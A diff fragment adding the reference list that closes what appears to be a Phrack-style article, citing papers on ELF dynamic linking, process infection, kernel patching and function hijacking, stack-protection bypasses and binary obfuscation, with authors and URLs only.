+  [6] Understanding ELF rtld internals			mayhem
+  devhell.org/~mayhem/papers/elf-rtld.txt
+
+  [7] More ELF buggery (bugtraq post)			thegrugq
+  www.securityfocus.com/archive/1/274283/2002-05-21/2002-05-27/0
+
+  [8] Runtime process infection				anonymous
+  phrack.org/phrack/59/p59-0x08.txt
+
+  [9] Subversive ELF dynamic linking			thegrugq
+  downloads.securityfocus.com/library/subversiveld.pdf
+
+  [10] Static kernel patching				jbtzhm
+  phrack.org/phrack/60/p60-0x08.txt
+ 
+  [11] Run-time kernel patching				silvio
+  www.u-e-b-i.com/silvio/runtime-kernel-kmem-patching.txt
+
+  [12] Bypassing stackguard and stackshield		bulba/kil3r
+  phrack.org/phrack/56/p56-0x05
+
+  [13] Kernel function hijacking			silvio
+  www.u-e-b-i.com/silvio/kernel-hijack.txt
+
+  [14] IA32 advanced function hooking			mayhem
+  phrack.org/phrack/58/p58-0x08
+
+  [15] Unbodyguard (solaris kernel function hijacking)	noir
+  gsu.linux.org.tr/~noir/b.tar.gz
+
+  [16] The object code obfuscator tool of burneye2	scut
+  segfault.net/~scut/objobf/
+
+  [17] Secure Execution Via Program Shepherding		Vladimir Kiriansky
+  www.cag.lcs.mit.edu/dynamorio/security-usenix.pdf	Derek Bruening
+						 	Saman Amarasinghe
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
